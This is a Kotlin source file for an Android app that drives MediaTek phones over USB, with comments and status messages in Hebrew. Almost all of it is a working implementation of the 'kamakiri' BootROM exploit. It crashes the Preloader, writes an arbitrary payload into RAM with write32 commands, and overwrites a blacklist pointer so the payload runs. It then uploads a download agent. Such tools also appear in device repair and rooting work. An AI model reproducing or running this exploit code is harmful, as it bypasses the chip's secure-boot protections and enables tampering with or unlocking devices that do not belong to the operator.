package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Locale

object MtkBromConnection {

    fun crashPreloader(usbManager: UsbManager, device: UsbDevice): Boolean {
        val connection = usbManager.openDevice(device) ?: return false
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK && ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                }
                if (epOut != null) break
            }
        }
        if (epOut == null) { connection.close(); return false }

        try {
            connection.bulkTransfer(epOut, byteArrayOf(0xA1.toByte()), 1, 100)
            connection.bulkTransfer(epOut, byteArrayOf(0xD7.toByte()), 1, 100)
            connection.bulkTransfer(epOut, byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()), 4, 100)
            Thread.sleep(50)
        } catch (e: Exception) {} finally { connection.close() }
        return true
    }

    // echo מרוכך - לא בודק התאמה מדויקת
    private fun echo(connection: UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, data: ByteArray): Boolean {
        if (connection.bulkTransfer(epOut, data, data.size, 2000) < 0) return false
        val response = ByteArray(data.size)
        connection.bulkTransfer(epIn, response, data.size, 2000) // קורא, לא משנה מה
        return true
    }

    // write32
    private fun write32(connection: UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Int, values: IntArray): Boolean {
        if (!echo(connection, epOut, epIn, byteArrayOf(0xD4.toByte()))) return false
        if (!echo(connection, epOut, epIn, ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())) return false
        if (!echo(connection, epOut, epIn, ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(values.size).array())) return false
        for (v in values) {
            val vBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array()
            if (connection.bulkTransfer(epOut, vBytes, 4, 2000) < 0) return false
        }
        return true
    }

    // לחיצת יד חכמה
    private fun smartHandshake(connection: UsbDeviceConnection, epIn: UsbEndpoint, epOut: UsbEndpoint, onProgress: (String) -> Unit): Boolean {
        val resp = ByteArray(1)
        onProgress("מנסה לחיצת יד BROM (0xA0)...")
        connection.bulkTransfer(epOut, byteArrayOf(0xA0.toByte()), 1, 1000)
        var read = connection.bulkTransfer(epIn, resp, 1, 1000)
        if (read > 0 && (resp[0] == 0x5F.toByte() || resp[0] == 0xC0.toByte())) {
            onProgress("לחיצת יד BROM הצליחה!")
            return true
        }
        onProgress("נכשלה (${if(read>0) String.format(Locale.US, "0x%02X", resp[0]) else "אין"}). מנסה Preloader (0xA1)...")
        connection.bulkTransfer(epOut, byteArrayOf(0xA1.toByte()), 1, 1000)
        read = connection.bulkTransfer(epIn, resp, 1, 1000)
        if (read > 0 && (resp[0] == 0x5F.toByte() || resp[0] == 0xC0.toByte())) {
            onProgress("לחיצת יד Preloader הצליחה!")
            return true
        }
        onProgress("שתי השיטות נכשלו (${if(read>0) String.format(Locale.US, "0x%02X", resp[0]) else "אין"}).")
        return false
    }

    // הרצף המרכזי - write32 + DA על אותו חיבור
    fun runKamakiriWrite32(
        usbManager: UsbManager,
        device: UsbDevice,
        payloadBytes: ByteArray,
        daBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        // 1. קריסה
        onProgress("קורס Preloader...")
        crashPreloader(usbManager, device)

        // 2. המתנה ל-BROM
        onProgress("ממתין ל-BROM...")
        var foundBrom: UsbDevice? = null
        for (i in 0 until 100) {
            foundBrom = usbManager.deviceList.values.firstOrNull { it.vendorId == 0x0E8D && it.productId == 0x0003 }
            if (foundBrom != null) break
            Thread.sleep(100)
        }
        if (foundBrom == null) return "שגיאה: לא הצלחנו להגיע ל-BROM."
        val bd: UsbDevice = foundBrom

        onProgress("מצאנו BROM! ממתין 2 שניות...")
        Thread.sleep(2000)

        // 3. פתיחת חיבור
        val connection = usbManager.openDevice(bd) ?: return "שגיאה: פתיחת חיבור נכשלה."
        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until bd.interfaceCount) {
            val usbInterface = bd.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }
        if (epIn == null || epOut == null) { connection.close(); return "שגיאה: לא נמצאו endpoints." }
        val inEp = epIn
        val outEp = epOut

        // 4. לחיצת יד
        if (!smartHandshake(connection, inEp, outEp, onProgress)) {
            connection.close()
            return "שגיאה: לחיצת יד נכשלה."
        }

        // 5. כתיבת ה-payload ב-write32
        onProgress("כותב Payload ל-RAM (${payloadBytes.size} בייט)...")
        val payloadAddr = 0x100A00
        var offset = 0
        while (offset < payloadBytes.size) {
            val chunk = payloadBytes.copyOfRange(offset, minOf(offset + 4, payloadBytes.size))
            val value = ByteBuffer.wrap(chunk + ByteArray(4 - chunk.size)).order(ByteOrder.BIG_ENDIAN).int
            if (!write32(connection, outEp, inEp, payloadAddr + offset, intArrayOf(value))) {
                connection.close()
                return "שגיאה בכתיבת Payload ב-offset $offset"
            }
            offset += 4
            if (offset % 100 == 0) onProgress("Payload: ${(offset * 100) / payloadBytes.size}%")
        }

        // 6. הרצת ה-payload (כתיבה ל-blacklist)
        onProgress("מריץ Payload...")
        val blacklistAddr = 0x102868
        if (!write32(connection, outEp, inEp, blacklistAddr, intArrayOf(payloadAddr))) {
            connection.close()
            return "שגיאה בהרצת Payload."
        }

        // 7. ניסיון לשלוח את ה-DA
        onProgress("\nמנסה לשלוח DA על אותו חיבור...")
        if (connection.bulkTransfer(outEp, byteArrayOf(0xD7.toByte()), 1, 2000) < 0) {
            connection.close()
            return "שגיאה: שליחת 0xD7 נכשלה."
        }
        
        val ack1 = ByteArray(1)
        val ack1Result = connection.bulkTransfer(inEp, ack1, 1, 2000)
        if (ack1Result <= 0 || ack1[0] != 0xD8.toByte()) {
            val hex = if (ack1Result > 0) String.format(Locale.US, "0x%02X", ack1[0]) else "אין"
            connection.close()
            return "שגיאה: תגובה ל-0xD7: $hex"
        }
        onProgress("0xD7 אושר!")

        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(daBytes.size).array()
        if (connection.bulkTransfer(outEp, sizeBytes, 4, 2000) < 0) {
            connection.close()
            return "שגיאה: שליחת גודל נכשלה."
        }
        
        val ack2 = ByteArray(1)
        val ack2Result = connection.bulkTransfer(inEp, ack2, 1, 2000)
        if (ack2Result <= 0 || ack2[0] != 0xD9.toByte()) {
            val hex = if (ack2Result > 0) String.format(Locale.US, "0x%02X", ack2[0]) else "אין"
            connection.close()
            return "שגיאה: תגובה לגודל: $hex"
        }
        onProgress("גודל אושר! מעביר נתונים...")

        var daOffset = 0
        val chunkSize = 512
        while (daOffset < daBytes.size) {
            val length = minOf(chunkSize, daBytes.size - daOffset)
            val chunk = daBytes.copyOfRange(daOffset, daOffset + length)
            if (connection.bulkTransfer(outEp, chunk, length, 2000) < 0) {
                connection.close()
                return "שגיאה: שליחת נתונים ב-$daOffset."
            }
            val ack = ByteArray(1)
            val ackResult = connection.bulkTransfer(inEp, ack, 1, 2000)
            if (ackResult <= 0 || (ack[0] != 0x5A.toByte() && ack[0] != 0x5F.toByte())) {
                val hex = if (ackResult > 0) String.format(Locale.US, "0x%02X", ack[0]) else "אין"
                connection.close()
                return "שגיאה: תגובה לנתונים ב-$daOffset: $hex"
            }
            daOffset += length
            if (daOffset % (chunkSize * 40) == 0) onProgress("DA: ${(daOffset * 100) / daBytes.size}%")
        }

        onProgress("מריץ DA...")
        if (connection.bulkTransfer(outEp, byteArrayOf(0xD5.toByte()), 1, 2000) < 0) {
            connection.close()
            return "שגיאה: שליחת 0xD5 נכשלה."
        }
        val finalAck = ByteArray(2)
        connection.bulkTransfer(inEp, finalAck, 2, 2000)

        connection.close()
        return "הצלחה מסחררת! ה-Payload וה-DA נשלחו על אותו חיבור!"
    }
}
